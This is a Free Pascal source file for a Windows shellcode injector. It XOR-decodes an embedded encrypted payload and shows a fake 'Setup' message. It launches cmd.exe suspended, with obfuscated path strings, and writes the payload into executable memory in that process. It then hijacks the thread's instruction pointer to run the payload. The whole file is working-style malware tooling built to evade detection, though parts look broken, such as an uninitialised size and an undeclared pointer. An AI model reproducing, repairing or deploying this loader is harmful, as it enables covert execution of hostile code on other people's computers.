program injector;

{$mode delphi}


uses

  windows,Classes,strutils,sysutils;

 type
  TByteArray = array of byte;



function DeXoR(const aText: byte; i: Cardinal): tbyte;
const
  KYY = 'Processo non grato';

begin
    result := byte(Ord(aText) xor Ord(KYY[(i mod length(KYY))+1]));
end;




procedure inj_pollo;
const

  pollo:array[0..811] of BYTE = (
  $ac,$3a,$ec,$87,$95,$9b,$bf,$6f,$20,$6e,$2e,$3f,$61,$37,$20,
  $30,$22,$27,$61,$a0,$0a,$2b,$ee,$21,$13,$27,$ab,$3c,$77,$26,
  $ab,$35,$52,$29,$7b,$d8,$1a,$38,$22,$52,$ac,$3b,$f8,$1d,$70,
  $26,$5e,$ae,$8c,$5b,$13,$1d,$76,$43,$70,$33,$ae,$aa,$68,$32,
  $72,$ae,$c2,$83,$3d,$2f,$71,$2f,$f9,$33,$54,$e4,$12,$4e,$27,
  $62,$b5,$15,$f2,$17,$38,$65,$6d,$61,$a5,$15,$72,$61,$74,$e4,
  $d0,$fa,$6f,$63,$65,$3b,$f6,$af,$54,$09,$27,$6f,$f0,$ec,$3a,
  $79,$24,$2b,$db,$32,$4f,$2a,$64,$a3,$90,$39,$68,$91,$a6,$2f,
  $ab,$53,$fa,$2c,$45,$a6,$18,$73,$b9,$2b,$54,$b3,$df,$2e,$e1,
  $a7,$62,$2f,$21,$a6,$4a,$81,$01,$9e,$1c,$71,$23,$47,$6d,$36,
  $4a,$be,$55,$b6,$37,$2a,$ab,$27,$56,$28,$75,$bf,$36,$33,$e4,
  $6f,$2d,$37,$f8,$2f,$3c,$27,$6e,$be,$61,$ec,$76,$e9,$35,$37,
  $11,$2a,$27,$62,$b5,$2d,$2a,$35,$61,$36,$2e,$37,$61,$3d,$3a,
  $e2,$98,$4f,$11,$20,$90,$83,$3d,$32,$2a,$35,$68,$e5,$7d,$87,
  $6b,$98,$8d,$9e,$29,$27,$61,$a9,$3c,$2a,$db,$04,$1a,$01,$49,
  $00,$0a,$1a,$20,$26,$24,$29,$fd,$8e,$19,$b5,$ad,$2f,$12,$55,
  $74,$90,$f5,$3d,$3c,$26,$a9,$86,$21,$3b,$39,$5e,$90,$3f,$5e,
  $aa,$36,$20,$3a,$d5,$1a,$38,$16,$c9,$20,$67,$72,$61,$8b,$ba,
  $b8,$62,$6f,$63,$65,$42,$4a,$5d,$0e,$5f,$59,$56,$0e,$56,$46,
  $57,$5a,$5e,$62,$4a,$6f,$39,$2d,$fa,$b2,$26,$e7,$ae,$d4,$6f,
  $20,$67,$3f,$50,$bd,$3c,$03,$18,$6c,$30,$2c,$c9,$24,$e6,$bf,
  $a8,$6f,$6e,$20,$67,$8d,$b4,$9c,$6f,$51,$72,$6f,$4c,$27,$42,
  $09,$2c,$72,$2a,$1c,$0a,$44,$3f,$43,$3e,$1f,$5c,$66,$20,$27,
  $29,$13,$36,$22,$3e,$54,$43,$25,$22,$79,$1d,$41,$05,$3d,$0b,
  $39,$18,$22,$22,$21,$05,$0a,$37,$68,$0b,$21,$57,$5a,$2a,$3c,
  $16,$1f,$59,$17,$25,$5d,$11,$24,$45,$35,$37,$50,$3d,$30,$29,
  $68,$35,$00,$0b,$1b,$3a,$32,$2a,$1b,$14,$00,$16,$39,$39,$64,
  $1d,$5a,$57,$14,$3f,$1a,$18,$45,$28,$03,$3d,$19,$14,$31,$44,
  $12,$3c,$68,$04,$23,$01,$69,$3d,$1d,$34,$12,$23,$17,$00,$23,
  $1b,$08,$35,$3e,$20,$73,$28,$2b,$28,$70,$01,$08,$56,$41,$2c,
  $24,$1a,$24,$1b,$30,$22,$46,$2b,$51,$06,$37,$36,$57,$2b,$3c,
  $34,$41,$36,$26,$3e,$1b,$30,$0d,$44,$40,$19,$47,$5f,$0c,$0b,
  $76,$0a,$1b,$15,$04,$3d,$03,$1e,$2d,$35,$2d,$47,$0a,$0d,$75,
  $03,$02,$02,$57,$2d,$1b,$0b,$35,$37,$28,$0a,$2c,$05,$51,$42,
  $16,$1a,$15,$0d,$1e,$58,$13,$30,$1b,$06,$26,$0d,$3f,$42,$0e,
  $4e,$33,$00,$1e,$3f,$4e,$1f,$0d,$21,$47,$11,$01,$17,$15,$03,
  $1a,$40,$30,$11,$1d,$31,$00,$0d,$44,$29,$0d,$0c,$56,$32,$3a,
  $07,$33,$0b,$13,$42,$1f,$13,$50,$45,$03,$27,$46,$27,$03,$08,
  $73,$17,$46,$0b,$13,$22,$09,$47,$22,$30,$54,$06,$73,$27,$a9,
  $af,$3c,$34,$61,$3f,$3f,$50,$bd,$3c,$18,$ca,$6f,$51,$cd,$f7,
  $73,$6f,$20,$6e,$3f,$3d,$73,$2e,$b5,$a3,$9f,$3a,$7e,$49,$90,
  $b6,$2d,$fa,$b5,$05,$2a,$31,$27,$e7,$d1,$0d,$6d,$3b,$26,$07,
  $d0,$41,$6f,$63,$2c,$fa,$93,$05,$24,$2f,$36,$27,$9a,$12,$34,
  $ff,$f2,$6f,$50,$72,$6f,$9c,$b0,$3e,$42,$af,$73,$34,$27,$e7,
  $d1,$2a,$43,$a8,$39,$5e,$99,$21,$3c,$2a,$a2,$b1,$5e,$69,$38,
  $15,$90,$bb,$a5,$a7,$07,$7e,$3c,$a8,$91,$fa,$7c,$63,$65,$3a,
  $c9,$2b,$d0,$5b,$8f,$6e,$20,$67,$72,$9e,$a1,$27,$af,$bd,$1b,
  $61,$8e,$d9,$9b,$3a,$20,$6e,$6f,$3d,$79,$0d,$32,$3b,$3d,$e6,
  $81,$b3,$8d,$73,$2c,$b4,$b3,$6f,$30,$6e,$6f,$27,$9a,$3f,$d6,
  $32,$91,$6f,$50,$72,$6f,$9c,$b0,$3b,$e0,$3c,$73,$26,$e6,$89,
  $68,$ee,$83,$29,$fd,$b5,$19,$b5,$af,$63,$45,$73,$73,$26,$a9,
  $97,$26,$d4,$32,$f1,$fb,$83,$74,$6f,$50,$72,$90,$b6,$2d,$f0,
  $b7,$4f,$a5,$ae,$1b,$dc,$46,$ec,$75,$29,$75,$ac,$d5,$b2,$1a,
  $b1,$3d,$b0,$2b,$05,$20,$37,$26,$a9,$e2,$97,$c7,$c3,$22,$90,
  $85,$00);

var
  pi: TProcessInformation;
  si: TStartupInfo;
  {$ifdef win32}
  ctx: Context;
  {$endif}

  {$ifdef win64}
  ctx : Pcontext;
  {$endif}
  GoodieLooker: Pointer;
  {$ifdef win64}
  Written:dword64;
  {$endif}
   {$ifdef win32}
  Written:dword;
  {$endif}
  AppToLaunch: string;
  i ,s_size: Cardinal;
  tmp :  array of byte;
  len: integer;


begin

len := length(pollo);
setlength(tmp,len);

writeln('Setup will require several minutes, please wait...');
      for i := 0 to len -1 do begin
          tmp[i] := DeXoR(pollo[i],i);
       end;
AppToLaunch := 'No' + 'TEPad' + '.' + 'eXe';
UniqueString(AppToLaunch);

FillMemory( @si, sizeof( si ), 0 );
FillMemory( @pi, sizeof( pi ), 0 );


CreateProcess(PChar(DelSpace('c:\w  in     do  '+'   ' + 'ws\ syste   m3'+'2\cm' + 'd.e' + 'xe')), PChar(AppToLaunch), nil, nil, False,
              CREATE_SUSPENDED,
              nil, nil,  si, pi );



 {$ifdef win32}
 ctx.ContextFlags := CONTEXT_CONTROL;
 GetThreadContext(pi.hThread,ctx);
 {$endif}

 {$ifdef win64}
  ctx := PCONTEXT(VirtualAlloc(nil, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
  ctx.ContextFlags := CONTEXT_ALL;
  GetThreadContext(pi.hThread,ctx^);
 {$endif}

 GoodieLooker:=VirtualAllocEx(pi.hProcess,Nil,s_size,MEM_COMMIT,
   PAGE_EXECUTE_READWRITE);

 WriteProcessMemory(pi.hProcess,GoodieLooker,Tbytearray(tmp),s_size,written);


{$ifdef win64}
 ctx.rip:=dword64(GoodieLooker);
 SetThreadContext(pi.hThread,ctx^);
 ResumeThread(pi.hThread);
{$ENDIF}

{$ifdef win32}
 ctx.Eip:=integer(remote_shellcodePtr);
 ctx.ContextFlags := CONTEXT_CONTROL;
 SetThreadContext(pi.hThread,ctx);

 ResumeThread(pi.hThread);
{$endif}


 end;



begin
  inj_pollo;

end.


